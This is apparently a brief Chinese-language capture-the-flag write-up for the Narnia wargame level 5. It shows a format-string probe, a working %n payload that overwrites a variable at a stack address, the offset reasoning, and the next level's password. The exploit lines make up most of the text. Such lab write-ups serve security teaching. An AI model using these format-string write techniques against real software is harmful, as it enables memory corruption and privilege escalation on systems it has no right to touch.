### 解題思路

```bash
narnia5@narnia:/narnia$ ./narnia5 $(perl -e 'print "AAAA%x.%x.%x.%x"')
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA41414141.31343134.31343134.3331332e] (39)
i = 1 (0xffffd440)
```
我們知道就在第一個%x 就讀到自己的輸入
```
./narnia5 $(perl -e 'print "AAAA\x40\xd4\xff\xff%492x%n"')

```
把0xffffd440 用 AAAA 往後退4bytes, 原因是我們需要%x 來控制長度，再用 %n 來寫進第地址

cat /etc/narnia_pass/narnia6: BNSjoSDeGL

0xf7df2140